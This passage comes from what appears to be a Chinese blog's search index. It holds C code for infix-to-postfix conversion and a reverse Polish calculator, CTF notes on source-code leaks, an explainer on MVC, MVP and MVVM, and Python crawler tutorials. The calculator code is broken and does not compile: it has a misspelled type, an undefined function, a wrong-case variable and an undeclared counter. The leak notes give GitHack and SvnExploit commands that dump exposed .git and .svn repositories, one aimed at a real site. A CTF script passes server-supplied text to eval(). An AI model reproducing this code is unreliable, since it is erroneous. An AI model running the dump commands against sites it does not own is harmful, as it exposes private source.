依次弹出s2中的元素并输出，结果的逆序即为中缀表达式对应的后缀表达式（转换为前缀表达式时不用逆序） 例如，将中缀表达式“1+((2+3)×4)-5”转换为后缀表达式的过程如下： 因此结果为“1 2 3 + 4 × + 5 -” 3.4、C语言实现中缀表达式变后缀表达式#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Node{ char ele; struct Node * next;}Node;typedef Node * Stack;Stack MakeStack(void)//新建栈并返回栈顶{ Stack S = (Node *)malloc(sizeof(Node)); S-&gt;next = NULL; return S;}void MakeNUll(Stack S)//置空栈{ S-&gt;next = NULL;}void Pop(Stack S)//将栈顶弹出{ Stack temp = S-&gt;next; S-&gt;next = temp-&gt;next;}void Push(Stack S, char c)//将新节点压入栈{ Stack temp = (Node *)malloc(sizeof(Node)); temp-&gt;ele = c; temp-&gt;next = S-&gt;next; S-&gt;next = temp;}Stack FindHead(Stack S)//返回栈顶{ Stack temp = S-&gt;next; return temp;}void PrintHead(Stack S)//打印栈顶元素{ Stack temp = S-&gt;next; printf(&quot;%c&quot;, temp-&gt;ele);}int main(void){ Stack S = MakeStack(); int i = 0; char str[200]; printf(&quot;Type something.\\n&quot;); gets(str); while(str[i] != &apos;\\0&apos;) { if(str[i] == &apos;+&apos; || str[i] == &apos;-&apos;)//如果str[i]是加号或减号，则先弹出栈顶直到栈已空或栈顶元素为左括号，再将str[i]压入栈 { if(FindHead(S) == NULL)//若栈已空时，栈顶指针为空，找不到其元素，故须单独讨论 { Push(S, str[i]); } else { while(FindHead(S)-&gt;ele == &apos;+&apos; || FindHead(S)-&gt;ele == &apos;-&apos; || FindHead(S)-&gt;ele == &apos;*&apos; || FindHead(S)-&gt;ele == &apos;/&apos;) { PrintHead(S); Pop(S); } Push(S, str[i]); } } else if(str[i] == &apos;*&apos; || str[i] == &apos;/&apos;)//如果str[i]是乘号或除号，则只有栈顶也是乘除号时才需要弹出 { if(FindHead(S) == NULL) { Push(S, str[i]); } else { while(FindHead(S)-&gt;ele == &apos;*&apos; || FindHead(S)-&gt;ele == &apos;/&apos;) { PrintHead(S); Pop(S); } Push(S, str[i]); } } else if(str[i] == &apos;(&apos;)//如果str[i]是左括号则直接压入栈 { Push(S, str[i]); } else if(str[i] == &apos;)&apos;)//如果str[i]是右括号，则打印并弹出栈中第一个左括号前的所有操作符，最后将此左括号直接弹出 { while(FindHead(S)-&gt;ele != &apos;(&apos;) { PrintHead(S); Pop(S); } Pop(S); } else//如果str[i]不是操作符则直接打印 { printf(&quot;%c&quot;, str[i]); } i++; } while(FindHead(S) != NULL)//遍历后如果栈不为空，则弹出所有操作符 { PrintHead(S); Pop(S); } return 0;} 3.5、C语言实现逆波兰计算器#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;math.h&gt;#define STACK_INIT_SIZE 20#define STACKINCREMENT 10#define MAXBUFFER 10typedef double ElemType;typedef struct{ ElemType *base; ElemType *top; int stackSize;}sqStack;// 创建一个栈void InitStack(sqlStack *s){ s-&gt;base = (ElemType *)malloc(STACK_INIT_SIZE *sizeof(ElemType)); if(!s-&gt;base){ exit(0); } s-&gt;top = s-&gt;base; s-&gt;stackSize = STACK_INIT_SIZE;}// 压栈void Push(sqStack *s, ElemType e){ if(s-&gt;top - s-&gt;base &gt;= s-&gt;stackSize){ s-&gt;base = (ElemType *)realloc(s-&gt;base, (s-&gt;stackSize + STACKINCREMENT)*sizeof(ElemType)); if(!s-&gt;base){ exit(0); } } *(s-&gt;top) = e; s-&gt;top++;}void Pop(sqStack *s, ElemType *e){ if(s-&gt;top == s-&gt;base){ return; } *e = *--(s-&gt;top);}// 计算栈的当前容量 int StackLen(sqStack s){ return (s.top - s.base);}double main(){ sqStack s; char c; double d, e; char str[MAXBUFFER]; InitStacke(&amp;s); printf(&quot;请按逆波兰表达式输入待计算数据，数据与运算符之间用空格隔开，以#号作为结束标志：\\n&quot;); scanf(&quot;%c&quot;, &amp;c); while(C != &apos;#&apos;){ while(isdigit(c) || c==&apos;.&apos;){ // 用于过滤数字 str[i++] = c; str[i] = &apos;\\0&apos;; if(i&gt;=10){ printf(&quot;出错：输入的单个数据过大!\\n&quot;); return -1; } scanf(&quot;%c&quot;, &amp;c); if(c == &apos; &apos;){ d = atof(str); Push(&amp;s, d); i = 0; break; } } switch(c){ case &apos;+&apos;: Pop(&amp;s, &amp;e); Pop(&amp;s, &amp;d); Push(&amp;s, d+e); break; case &apos;-&apos;: Pop(&amp;s, &amp;e); Pop(&amp;s, &amp;d); Push(&amp;s, d-e); break; case &apos;*&apos;: Pop(&amp;s, &amp;e); Pop(&amp;s, &amp;d); Push(&amp;s, d*e); break; case &apos;/&apos;: Pop(&amp;s, &amp;e); Pop(&amp;s, &amp;d); if(e != 0){ Push(&amp;s, d/e); }else{ printf(&quot;\\n出错：除数为零!\\n&quot;); return -1; } break; } scanf(&quot;%c&quot;, &amp;c); } Pop(&amp;s, &amp;d); printf(&quot;\\n最终的计算结果为:%f\\n&quot;, d); return 0;}// 计算案例 // 1 2 - 4 5 + * 结果：9.000000// 5 - (6 + 7) * 8 + 9 / 4 5 6 7 + 8 * - 9 4 / + 结果：-96.750000","link":"2019/01/05/%E6%B3%A2%E5%85%B0%E5%BC%8F%E4%B8%8E%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"title":"源码泄露","text":"文件源码泄露首先通过dirsearch看一下是否是泄露https://github.com/maurosoria/dirsearch 1、hg 源码泄露 hg init 时会产生 .hg 文件。 利用工具 dvcs-ripper 2、Git 源码泄露 .git 目录内有代码的变更记录等文件，如果部署时该目录下的文件可被访问，可能会被利用来恢复源代码。 /.git/.git/HEAD/.git/index/.git/config/.git/description 貌似这两个脚本只能在linux下跑？我win10本地不行python2-GitHack python GitHack.py http://www.openssl.org/.git/ python2-GitHacker（可恢复完整 Git 仓库） python GitHacker.py http://www.openssl.org/.git/ python2-https://github.com/gakki429/Git_Extract $ python git_extract.py http://example.com/.git/ 一个存在 .git 泄露的网站$ python git_extract.py example/.git/ 一个本地的 .git 路径 例题jarvios的babyphp 3、.DS_Store 文件泄露 Mac OS 中会包含有 .DS_Store 文件，包含文件名等信息。 利用工具 ds＿store＿exp例题bugku ctf sql注入2 4、网站备份文件 管理员备份网站文件后错误地将备份放在 Web 目录下。 常见的后缀名： .rar.zip.7z.tar.tar.gz.bak.txt 5、SVN 泄露 敏感文件： /.svn/.svn/wc.db/.svn/entries https://github.com/admintony/svnExploit检测SVN源代码泄露 python SvnExploit.py -u http://192.168.27.128/.svn 下载源代码 python SvnExploit.py -u http://192.168.27.128/.svn --dump 6、WEB-INF / web.xml 泄露 WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系。 WEB-INF 主要包含一下文件或目录： /WEB-INF/web.xml ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/ ：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在。jar 文件中。 /WEB-INF/lib/ ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。 /WEB-INF/src/ ：源码目录，按照包名结构放置各个 java 文件。 /WEB-INF/database.properties ：数据库配置文件。 通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，在通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了： location ~ ^/WEB-INF/* { deny all; } # 或者return 404; 或者其他！ 7、CVS 泄露 http://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构 取回源码 bk clone http://url/name dir 8、.swp文件关于swp文件使用vi，经常可以看到swp这个文件,那这个文件是怎么产生的呢，当你打开一个文件，vi就会生成这么一个.(filename)swp文件以备不测（不测下面讨论），如果你正常退出，那么这个这个swp文件将会自动删除。下面说不测。直接访问.submit.php.swp即可","link":"2019/07/20/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"title":"简单介绍MVC,MVP,MVVM模式","text":"概述：MVC,MVP,MVVM是三种常见的架构模式(Architectural Pattern)，还有MVI，MTV,它通过分离关注点来改进代码组织方式。不同于设计模式(Design Pattern),只是为了解决一类问题而总结出的抽象方法，一种架构模式往往能使用多种设计模式。 一、MVCMVC模式是MVP,MVVM模式的基础，这两种模式更像是MVC模式的优化改良版,他们三个的MV即Model，view相同，不同的是MV之间的纽带部分。最初接触MVC模式是曾经阿汤哥手把手♂教的spring mvc，感谢一路上帮助过自己的所有人。 1.1、mvc简介MVC是Model-View-Controller的缩写，它将应用程序划分为三个部分： Model: 模型（用于封装与应用程序的业务逻辑相关的数据以及对数据的处理方法） View: 视图（渲染页面） Controller: 控制器（M和V之间的连接器，用于控制应用程序的流程，及页面的业务逻辑） MVC允许在不改变视图的情况下改变视图对用户输入的响应方式，用户对View的操作交给了Controller处理，在Controller中响应View的事件调用Model的接口对数据进行操作，一旦Model发生变化便通知相关视图进行更新。) 1.2、MVC特点MVC模式的特点在于实现关注点分离，即应用程序中的数据模型与业务和展示逻辑解耦。在客户端web开发中，就是将模型(M-数据、操作数据)、视图(V-显示数据的HTML元素)之间实现代码分离，松散耦合，使之成为一个更容易开发、维护和测试的客户端应用程序。 View 传送指令到 Controller ； Controller 完成业务逻辑后，要求 Model 改变状态 ； Model 将新的数据发送到 View，用户得到反馈。 1.3、MVC的两种流程一种是通过 View 接受指令，传递给 Controller，然后对模型进行修改或者查找底层数据，最后把改动渲染在视图上。 另一种是通过controller接受指令，传给Model： 1.4、应用MVC模式的框架确实我认为是最多的，最开始接触的Spring MVC,然后ASP.net,Django甚至是某玖神(Orz膜玖神)的ofbiz框架都是使用MVC(虽然Django严格上是MVT模式，但是我个人觉得本质是MVC)，或者说是在MVC上改进，这里简单介绍一下spring mvc的模式。SpringMVC简介:springMVC框架是基于Java的实现了MVC框架模式的请求驱动类型的轻量级框架。前端控制器是DispatcherServlet接口实现类，映射处理器是HandlerMapping接口实现类，视图解析器是ViewResolver接口实现类，页面控制器是Controller接口实现类。SpringMVC的工作流程图如下：（1）客户端请求提交到前端控制器DispatcherServlet；（2）前端控制器DispatcherServlet查找一个或者多个映射处理器HandlerMapping，从而确定调用哪个页面控制器Controller对请求进行处理；（3）DispatcherServlet将请求提交给Controller；（4）Controller根据业务逻辑对请求进行处理，并返回ModelAndView；（5）DispatcherServlet查找一个或者多个ViewResolver，得到ModelAndView指定的视图view，并将model中的数据传入视图view中进行渲染；（6）DispatcherServlet将渲染后的视图返回响应； 由上述过程可见DispatcherServlet是Spring MVC的核心，它负责协调SpringMVC的各个组成部分对所有的Http请求进行处理，其主要工作如下：（1）截获符合特定格式的Http请求；（2）初始化DispatcherServlet上下文对应的WebApplicationContext，并将其与业务层、持久层的WebApplicationContext关联起来；（3）初始化Spring MVC的各个组件，并装配到DispatcherServlet中；其实本质上也是MVC模式的进阶版 二、MVVM 2.1、mvvm简介MVVM与MVC最大的区别就是：它实现了View和Model的自动同步，也就是当Model的属性改变时，我们不用再自己手动操作Dom元素，来改变View的显示，而是改变属性后该属性对应View层显示会自动改变。 2.2、典型的MVVM模式的代表，Vue刚好这两天在学习VUE,下面也是官网的一个例子html &lt;div id=&quot;app-5&quot;&gt; &lt;p&gt;{{ message }}&lt;/p&gt; &lt;button v-on:click=&quot;reverseMessage&quot;&gt;逆转消息&lt;/button&gt;&lt;/div&gt; js var app5 = new Vue({ el: &apos;#app-5&apos;, data: { message: &apos;Hello Vue.js!&apos; }, methods: { reverseMessage: function () { this.message = this.message.split(&apos;&apos;).reverse().join(&apos;&apos;) } }}) 这里的html部分相当于View层，可以看到这里的View通过通过模板语法来声明式的将数据渲染进DOM元素，当ViewModel对Model进行更新时，通过数据绑定更新到View。Vue实例中的data相当于Model层，而ViewModel层的核心是Vue中的双向数据绑定，即Model变化时VIew可以实时更新，View变化也能让Model发生变化。整体看来，MVVM比MVC精简很多，不仅简化了业务与界面的依赖，还解决了数据频繁更新的问题，不用再用选择器操作DOM元素。因为在MVVM中，View不知道Model的存在，Model和ViewModel也观察不到View，这种低耦合模式提高代码的可重用性。 三、MVP3.1、MVP简介MVP 全称：Model-View-Presenter ；MVP 是从经典的模式 MVC 演变而来，它们的基本思想有相通的地方：Controller/Presenter 负责逻辑的处理，Model 提供数据，View 负责显示。MVP模式可应用在于APP开发，其实还有MVI也应用于安卓。MVP的模型图这个图也很简单，当 View 需要更新数据时，首先去找 Presenter，然后 Presenter 去找 Model 请求数据，Model 获取到数据之后通知 Presenter，Presenter 再通知 View 更新数据，这样 Model 和 View 就不会直接交互了，所有的交互都由 Presenter 进行，Presenter 充当了桥梁的角色。很显然，Presenter 必须同时持有 View 和 Model 的对象的引用，才能在它们之间进行通信。 3.2、MVP模式的核心思想MVP把Activity中的UI逻辑抽象成View接口，把业务逻辑抽象成Presenter接口，Model类还是原来的Model。 3.3、与MVC区别 在MVP中，View并不直接使用Model，它们之间的通信是通过Presenter 也叫做中介(MVC中的Controller)来进行的，所有的交互都发生在Presenter内部。 在MVC中，View会直接从Model中读取数据而不是通过 Controller。 3.4、MVP的优点模型与视图完全分离，我们可以修改视图而不影响模型；◆ 可以更高效地使用模型，因为所有的交互都发生在一个地方——Presenter内部；◆ 我们可以将一个Presenter用于多个视图，而不需要改变Presenter的逻辑。这个特性非常的有用，因为视图的变化总是比模型的变化频繁；◆ 如果我们把逻辑放在Presenter中，那么我们就可以脱离用户接口来测试这些逻辑（单元测试）。 3.5、MVP的应用MVP应用于APP开发，由于本人app方面经验少，所以就不讲MVP在app开发的应用。我们来讲讲MVP找女朋友找老婆有两种方式 自己找 父母之命，媒妁之言（媒婆，中介） 当然我们都倾向于第一种方式，但是我们这里确实要讲讲第二种方式的业务逻辑 我要找妹子，我提出对妹子的要求（富萝莉的那种） 媒婆根据我的要求，找到对应满足我的要求的人 中间有三个角色与MVP各层对应的关系 要找妹子的我-&gt; V层-&gt; UI层 作为中介的媒婆-&gt; P层-&gt; Presenter 要找的富萝莉-&gt; M层-&gt; 数据层 所以媒婆（中介）会与V,M层交互，而V与M层相互没有直接交互，业务逻辑如下自己意会吧，祝大家都能找到妹子。","link":"2019/02/11/%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8DMVC-MVP-MVVM%E6%A8%A1%E5%BC%8F/"},{"title":"精通Python网络爬虫-一二三章基础","text":"科创要用到深层网络爬虫所以系统学一次python爬虫，另外一个项目采用spring boot当后端，果然面向需求编程才是王道，这本书叫精通python网络爬虫，不求精通，好歹入个门吧(还有个原因前几天拿爬虫试了试水，确实天下武功，唯快不破，脚本的速度真的可以为所欲为) 一、爬虫介绍1.1、为何学习网络爬虫（1）定制一个个性化的搜索引擎 搜索引擎离不开爬虫，例:百度（百度蜘蛛BaiduSpider）360(360Spider) 搜狗（SougouSpider）必应（BingBot）（2）数据分析（3）优化搜索引擎（4）工作生计（5）兴趣爱好 1.2、网络爬虫的组成网络爬虫由控制节点，爬虫节点，资源库构成。 控制节点：爬虫的中央控制器，根据URL地址分配线程，调用爬虫节点具体爬行。爬虫节点：应用相关算法，对网页进行具体爬行。资源库：将爬虫节点爬行结果存储到对应的资源库中。1.3、爬虫的分类 爬虫类型 具体说明 通用网络爬虫 爬行目标数据巨大，范围广 聚集网络爬虫 目标网页是定位与主题相关网页 增量式网络爬虫 只爬取内容发生变化的网页 深层网络爬虫 爬取深层页面 注明：在互联网中，网页按存在方式分类，分为表层页面和深层页面。 （1）表层页面，不需要提交表单，使用静态链接到达的静态页面。 （2）深层页面，需提交表单，才能获取的页面。 （3）深层网络爬虫最重要的部分是填写表单，以爬取深层页面。 二、搜索引擎核心爬虫与搜索引擎密不可分。下图所示搜索引擎的核心工作流程。（1）搜索引擎利用爬虫模块（控制器，爬行器）从互联网爬取相应网页存储至原始数据库中。 （2）对原始数据库中数据进行索引（相当于索引器给数据起名字），并存储到索引数据库中。 （3）用户交互检索信息，检索器会从索引数据库中获取数据进行相应的检索处理。 （4）同时，用户输入信息会被存储到用户日志数据库中。 （5）用户日志数据库中的数据会交给日志分析器进行处理。 （6）日志分析器会根据大量的用户数据去调用原始数据库和索引数据库，改变排名结果或进行其他操作。 三、网络爬虫实现原理与实现技术3.1、通用网络爬虫VS聚焦网络爬虫 通用网络爬虫 聚焦网络爬虫聚焦网络爬虫，是有目的的进行爬取。必须增加目标的定义和过滤机制。其执行原理和过程需要比通用网络爬虫多出三步，即目标的定义、过滤无关链接、下一步要爬取的 URL 地址的选取等。本质上就是增加了一个过滤机制 3.2、爬行策略 爬行策略 具体说明 深度优先爬行策略 A-D-E-B-C-F-G 广度优先爬行策略 A-B-C-D-E-F-G 大站优先策略 优先爬取大站（网页数量多的网站）中的 URL 地址 反链策略 优先爬取反链数量（被其他网页指向的次数）多的网站 其他爬行策略 如 OPIC 策略、Partial 策略、PageRank 策略等 反链策略要防止作弊现象，某些循环指向判断机制。 3.3、网站更新策略 更新策略 具体说明 用户体验策略 大部分用户只关注排名靠前的网页，爬虫优先更新排名结果靠前的网页 历史数据策略 依据网页历史更新数据，利用数学建模，预测下一次更新时间，从而确定更新周期 聚类分析策略 一般具有类似属性的网页更新频率类似–&gt;对海量网页进行聚类分析，形成多个类–&gt;对同一个类抽样，取平均值更新–&gt;从而确定爬行频率 3.4、网站分析算法 网页分析算法 具体说明 基于用户行为 基于用户访问行为（如访问频率、时长等） 基于网络拓扑（如PageRank，谷歌引擎核心算法） 依靠网页间链接关系计算权重，进行排名 基于网页内容 依据网页数据、文本网页内容特征等","link":"2019/02/25/%E7%B2%BE%E9%80%9APython%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-%E4%B8%80%E4%BA%8C%E4%B8%89%E7%AB%A0%E5%9F%BA%E7%A1%80/"},{"title":"精通Python网络爬虫-四五章基本使用","text":"一、时代变迁下的比较: Python2.x时代 Python3.x时代 import urllib2 import urllib.request,urllib.error import urllib import urllib2.request,urllib.error,urllib.parse import urlparse import urllib.parse urllib2.urlopen urllib.request.urlopen urllib.urlencode urllib.parse.urlencode urllib.quote urllib.request.quote cookielib.CookieJar http.CookieJar urllib2.Request urllib.request.Request 1.1、快速使用//导入模块&gt;&gt;&gt; import urllib.request//打开网页&gt;&gt;&gt; file=urllib.request.urlopen(&quot;http://baidu.com&quot;)//读取全部内容.内容赋给字符串变量&gt;&gt;&gt; data=file.read()//读取全部内容，内容赋给列表变量&gt;&gt;&gt; data=file.readlines()//读取一行内容&gt;&gt;&gt; dataline=file.readline()&gt;&gt;&gt; print dataline&gt;&gt;&gt; print data&gt;&gt;&gt; print(file.info())&gt;&gt;&gt; print(file.getcode())&gt;&gt;&gt; print(file.geturl()) URL标准中一般只允许一部分ASCII字符，如数字、字母、部分符号等。若是特殊字符，如中文、：、或者&amp;等，需要编码。编码格式： urllib.request.quote(“http://www.baidu.com&quot;)urllib.request.unquote(“http%3A//www.baidu.com&quot;) 保存本地方法1 &gt;&gt;&gt; fhandle=open(&quot;demo.html&quot;)&gt;&gt;&gt; fhandle.write(data)&gt;&gt;&gt; fhandle.close() 保存本地方法2 filename=urllib.request.urlretrieve(&quot;http://www.baidu.com&quot;,filename=&quot;demo.html&quot;) 1.2、模拟浏览器 – Headers 属性方法1、build_opener()修改报头 import urllib.requesturl=&quot;http://blog.csdn.net/weiwei_pig/article/details/51178226&quot;headers=(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Mobile Safari/537.36&quot;)opener = urllib.request.build_opener()opener.addheaders = [headers]data = opener.open(url).read()print(data) 方法2、用add_header()添加报头 import urllib.requesturl=&quot;http://blog.csdn.net/weiwei_pig/article/details/51178226&quot;req=urllib.request.Request(url)req.add_header(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Mobile Safari/537.36&quot;)data = urllib.request.urlopen(req).read() 1.3、超时设置,比如gayhunimport urllib.requestfor i in range(1,100): try: file = urllib.request.urlopen(&quot;https://github.com/&quot;,timeout=1) data = file.read() print(len(data)) except Exception as e: print(&quot;出现异常–&gt;&quot;+str(e)) 1.4、POST请求import urllib.requestimport urllib.parseurl = &quot;http://www.iqianyue.com/mypost&quot;postdata = urllib.parse.urlencode({&quot;name&quot;:&quot;Kitty&quot;,&quot;pass&quot;:&quot;haha&quot;}).encode(&quot;utf-8&quot;) req = urllib.request.Request(url,postdata)req.add_header(&quot;User-Agent&quot;,&quot;Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Mobile Safari/537.36&quot;)data = urllib.request.urlopen(req).read().decode(&apos;utf-8&apos;)print(data) 二、异常处理2.1、DebugLog开启import urllib.requesthttphd=urllib.request.HTTPHandler(debuglevel=1)httpshd=urllib.request.HTTPSHandler(debuglevel=1)opener=urllib.request.build_opener(httphd,httpshd)urllib.request.install_opener(opener)data=urllib.request.urlopen(&quot;http://edu.51cto.com&quot;)print(data) 2.2、URLErrorimport urllib.requestimport urllib.errortry: file=urllib.request.urlopen(&quot;http://www.baiduddd.com&quot;) print(file.read())except urllib.error.URLError as e: if hasattr(e,&quot;code&quot;): print(e.code) if hasattr(e,&quot;reason&quot;): print(e.reason)# except urllib.error.URLError as e:# print(e.reason)# except urllib.error.HTTPError as e:# print(e.code)# print(e.reason) 三、正则表达式的使用如果对正则表达式没概念，请移步正则表达式必知必会 3.1、正则表达式常用的功能函数包括：match、search、findall、sub1、1、re.match()函数函数语法： re.match(pattern, string, flags=0) def match(pattern, string, flags=0): &quot;&quot;&quot;Try to apply the pattern at the start of the string, returning a match object, or None if no match was found.&quot;&quot;&quot; return _compile(pattern, flags).match(string) 函数参数说明： pattern：匹配的正则表达式 string：要匹配的字符串 flag：标志位，用于控制正则表达式的匹配方式（是否匹配大小写、多行匹配等）作用：match()函数只在字符串的开始位置尝试匹配正则表达式，即从位置0开始匹配。如果匹配成功，则返回一个匹配的对象；如果字符串开始不符合正则表达式，则匹配失败，函数返回None。import retest = &apos;http://news.163.com/17/0624/10/CNMHVBJP0001899N.html&apos;print(re.match(r&apos;http&apos;,test)) # &lt;_sre.SRE_Match object; span=(0, 4), match=&apos;http&apos;&gt;print(re.match(r&apos;news&apos;,test)) # None 2、re.search()函数函数语法：1 re.search(pattern, string[, flags]) 1 def search(pattern, string, flags=0):2 &quot;&quot;&quot;Scan through string looking for a match to the pattern, returning3 a match object, or None if no match was found.&quot;&quot;&quot;4 return _compile(pattern, flags).search(string) re.search()匹配整个字符串，直到找到第一个匹配的，如果字符串中没有匹配的，则返回None。1 import re2 test = &apos;I am a loving child to learn.&apos;3 print(re.search(r&apos;I&apos;,test)) # &lt;_sre.SRE_Match object; span=(0, 1), match=&apos;I&apos;&gt;4 print(re.search(r&apos;learn&apos;,test)) # &lt;_sre.SRE_Match object; span=(23, 28), match=&apos;learn&apos;&gt;5 print(re.search(r&apos;alina&apos;,test)) # None 3、re.sub()函数函数语法： 1 re.sub(pattern,repl,string,count,flags) 1 def sub(pattern, repl, string, count=0, flags=0):2 &quot;&quot;&quot;Return the string obtained by replacing the leftmost3 non-overlapping occurrences of the pattern in string by the4 replacement repl. repl can be either a string or a callable;5 if a string, backslash escapes in it are processed. If it is6 a callable, it&apos;s passed the match object and must return7 a replacement string to be used.&quot;&quot;&quot;8 return _compile(pattern, flags).sub(repl, string, count) 函数参数说明： pattern：匹配的正则表达式 repl：替换的字符串 String：要被查找替换的原始字符串 count：匹配后替换的最大次数，默认0表示途欢所有的匹配 re.sub()函数用于替换字符串中的匹配项。1 import re2 test = &apos;I am a loving child to learn.&apos;3 print(re.sub(r&apos;child&apos;,&apos;MMMMM&apos;,test)) # 替换字符串，将child 替换成MMMMM 4、re.findall()函数函数语法：1 re.findall(pattern,string,flags) 1 def findall(pattern, string, flags=0):2 &quot;&quot;&quot;Return a list of all non-overlapping matches in the string.3 4 If one or more capturing groups are present in the pattern, return5 a list of groups; this will be a list of tuples if the pattern6 has more than one group.7 8 Empty matches are included in the result.&quot;&quot;&quot;9 return _compile(pattern, flags).findall(string) re.findall()可以获取字符串中所有匹配的字符串1 import re2 test = &apos;&lt;a href=&quot;http://www.educity.cn/zhibo/&quot; target=&quot;_blank&quot;&gt;直播课堂&lt;/a&gt;&apos;3 print(re.findall(r&apos;&lt;a href=&quot;(.*)&quot; target=&quot;_blank&quot;&gt;(.*)&lt;/a&gt;&apos;,test)) #[(&apos;http://www.educity.cn/zhibo/&apos;, &apos;直播课堂&apos;)] 3.2、常见匹配email import repattern = &quot;\\w+([.+-]\\w+)*@\\w+([.-]\\w+)*\\.\\w+([.-]\\w+)*&quot;string = &quot;&lt;a href=&apos;http://www.baidu.com&apos;&gt;百度&lt;/a&gt;&lt;br&gt;&lt;a href=&apos;w.linkings@gail.com&apos;&gt;电邮&lt;/a&gt;&quot;result = re.search(pattern,string)print(result)print(result.group(0)) 电话 import repattern = &quot;\\d{4}-\\d{7}|\\d{3}-\\d{8}&quot;string = &quot;0551-54321234513451451345&quot;result1 = re.search(pattern,string)print(result1)print(result1.group(0)) 网站 import repattern = &quot;[a-zA-Z]+://[^\\s]*[.com|.cn]&quot;string = &quot;&lt;a href=&apos;http://www.baidu.com&apos;&gt;百度首页&lt;/a&gt;&quot;result1 = re.search(pattern,string)print(result1)print(result1.group(0)) 四、Session一道CTF简答的题目,讲表达式结果迅速返回到服务器（秋名山老司机 import requestsimport reurl = &apos;http://120.24.86.145:8002/qiumingshan/&apos;s = requests.Session()source = s.get(url)expression = re.search(r&apos;(\\d+[+\\-*])+(\\d+)&apos;, source.text).group()result = eval(expression)post = {&apos;value&apos;: result}print(s.post(url, data = post).text) 五、更优雅的包，requests5.1、简单使用&gt;&gt;&gt; import requests然后，尝试获取某个网页。本例子中，我们来获取Github的公共时间线&gt;&gt;&gt; r = requests.get(&apos;https://github.com/timeline.json&apos;)&gt;&gt;&gt; r = requests.post(&quot;http://httpbin.org/post&quot;)&gt;&gt;&gt; r = requests.put(&quot;http://httpbin.org/put&quot;)&gt;&gt;&gt; r = requests.delete(&quot;http://httpbin.org/delete&quot;)&gt;&gt;&gt; r = requests.head(&quot;http://httpbin.org/get&quot;)&gt;&gt;&gt; r = requests.options(&quot;http://httpbin.org/get&quot;) 5.2、为URL传递参数&gt;&gt;&gt; payload = {&apos;key1&apos;: &apos;value1&apos;, &apos;key2&apos;: &apos;value2&apos;}&gt;&gt;&gt; r = requests.get(&quot;http://httpbin.org/get&quot;, params=payload)通过打印输出该URL，你能看到URL已被正确编码:&gt;&gt;&gt; print r.urlu&apos;http://httpbin.org/get?key2=value2&amp;key1=value1&apos; 5.3、响应内容&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get(&apos;https://github.com/timeline.json&apos;)&gt;&gt;&gt; r.text&apos;[{&quot;repository&quot;:{&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https://github.com/... Requests会自动解码来自服务器的内容。大多数unicode字符集都能被无缝地解码。 请求发出后，Requests会基于HTTP头部对响应的编码作出有根据的推测。当你访问r.text 之时，Requests会使用其推测的文本编码。你可以找出Requests使用了什么编码，并且能够使用 r.encoding 属性来改变它: &gt;&gt;&gt; r.encoding&apos;utf-8&apos;&gt;&gt;&gt; r.encoding = &apos;ISO-8859-1&apos; 如果你改变了编码，每当你访问 r.text ，Request都将会使用 r.encoding 的新值。 5.4、二进制响应内容你也能以字节的方式访问请求响应体，对于非文本请求: &gt;&gt;&gt; r.contentb&apos;[{&quot;repository&quot;:{&quot;open_issues&quot;:0,&quot;url&quot;:&quot;https://github.com/... Requests会自动为你解码 gzip 和 deflate 传输编码的响应数据。 例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码: &gt;&gt;&gt; from PIL import Image&gt;&gt;&gt; from StringIO import StringIO&gt;&gt;&gt; i = Image.open(StringIO(r.content)) 5.5、JSON响应内容&gt;&gt;&gt; import requests&gt;&gt;&gt; r = requests.get(&apos;https://github.com/timeline.json&apos;)&gt;&gt;&gt; r.json()[{u&apos;repository&apos;: {u&apos;open_issues&apos;: 0, u&apos;url&apos;: &apos;https://github.com/... 如果JSON解码失败， r.json 就会抛出一个异常。 5.6、原始响应内容在罕见的情况下你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw 。 如果你确实想这么干，那请你确保在初始请求中设置了 stream=True 。具体的你可以这么做: &gt;&gt;&gt; r = requests.get(&apos;https://github.com/timeline.json&apos;, stream=True)&gt;&gt;&gt; r.raw&lt;requests.packages.urllib3.response.HTTPResponse object at 0x101194810&gt;&gt;&gt;&gt; r.raw.read(10)&apos;\\x1f\\x8b\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x03&apos; 5.7、定制请求头如果你想为请求添加HTTP头部，只要简单地传递一个 dict 给 headers 参数就可以了。 例如，在前一个示例中我们没有指定content-type: &gt;&gt;&gt; import json&gt;&gt;&gt; url = &apos;https://api.github.com/some/endpoint&apos;&gt;&gt;&gt; payload = {&apos;some&apos;: &apos;data&apos;}&gt;&gt;&gt; headers = {&apos;content-type&apos;: &apos;application/json&apos;}&gt;&gt;&gt; r = requests.post(url, data=json.dumps(payload), headers=headers) 六、BeautifulSoup4的基本使用安装 pip install beautifulsoup4 使用 from bs4 import BeautifulSouphtml_str = 